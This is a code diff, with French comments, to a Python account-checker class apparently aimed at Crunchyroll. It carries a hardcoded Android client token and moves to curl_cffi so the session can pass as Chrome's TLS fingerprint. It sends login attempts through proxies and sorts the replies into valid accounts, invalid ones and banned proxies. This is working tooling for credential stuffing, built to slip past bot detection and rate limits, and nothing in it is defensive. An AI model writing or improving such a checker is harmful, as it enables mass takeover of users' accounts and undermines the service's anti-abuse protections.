@@ -1,16 +1,16 @@
-import tls_client
+from curl_cffi import requests
 import uuid
 
+# Token d'authentification officiel Android (v3.79.0+)
 ANDROID_BASIC_TOKEN = "dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="
 
 class CrunchyChecker:
     def __init__(self, proxy=None):
-        self.session = tls_client.Session(
-            client_identifier="chrome_120",
-            random_tls_extension_order=True
-        )
+        # Utilisation de curl_cffi pour usurper parfaitement l'empreinte Chrome (JA3)
+        # C'est la version robuste de tls-client pour Docker
+        self.session = requests.Session(impersonate="chrome120")
+        
         if proxy:
-            # Format attendu : ip:port ou user:pass@ip:port
             self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
         
         self.device_id = str(uuid.uuid4())
@@ -34,13 +34,15 @@ class CrunchyChecker:
         }
 
         try:
-            response = self.session.post(url, data=data, headers=headers, timeout_seconds=10)
-            if response.status_code == 403 or response.status_code == 1015:
+            response = self.session.post(url, data=data, headers=headers, timeout=10)
+            
+            if response.status_code in [403, 1015]:
                 return "BANNED_PROXY", None
             if response.status_code == 401:
                 return "INVALID", None
             if response.status_code == 200:
                 return "SUCCESS", response.json().get("access_token")
+                
             return "ERROR", None
-        except:
+        except Exception as e:
             return "TIMEOUT", None
